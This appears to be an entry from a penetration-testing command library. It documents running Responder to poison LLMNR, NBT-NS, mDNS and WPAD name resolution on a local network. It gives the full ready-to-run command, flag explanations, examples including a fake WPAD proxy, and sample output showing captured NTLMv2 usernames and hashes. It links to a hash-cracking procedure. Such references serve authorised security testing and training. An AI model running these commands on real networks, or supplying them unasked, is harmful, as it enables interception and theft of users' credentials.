---
type: command
executor: bash
data: sudo ./Responder.py -I $_INTERFACE -wfrd -P -v
tags:
  - poisoning
  - llmnr
  - ntlm
platforms:
  - Linux
verified: true
validated: true
---

# responder-run-llmnr-nbt-ns-mdns-poisoning

## Command

```bash
sudo ./Responder.py -I $_INTERFACE -wfrd -P -v
```

## Description

Runs Responder to poison LLMNR, NBT-NS, mDNS, and WPAD requests on the network, capturing NTLMv2 hashes from authentication attempts to the attacker's IP.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -I | Specifies the network interface to listen on | Yes |
| $_INTERFACE | Interface name (e.g., eth0) | Yes |
| -w | Enables WPAD poisoning | No |
| -f | Enables client fingerprinting | No |
| -r | Enables NBT-NS relay | No |
| -d | Enables MDNS/DNS poisoning | No |
| -P | Enables NTLM proxy authentication | No |
| -v | Verbose output | No |

## Examples

### Basic Usage

```bash
sudo ./Responder.py -I eth0 -wfrd -P -v
```

### Advanced Usage

```bash
sudo ./Responder.py -I wlan0 -wfrd -P -v --wpadhost fakeproxy
```

## Expected Output

```
[+] [LLMNR]  Poisoned answer sent to 192.168.1.50 for name example.local
[+] [SMB]    NTLMv2-SSP Client   : 192.168.1.50
[+] [SMB]    NTLMv2-SSP Username : user
[+] [SMB]    NTLMv2-SSP Hash     : user::DOMAIN:challenge:hash:...
```
Hashes are written to files in the hashes/ directory.

## Related

- [[procedures/Net-NTLMv2-Hash-Capture-and-Cracking]]
- [[tools/Responder]]
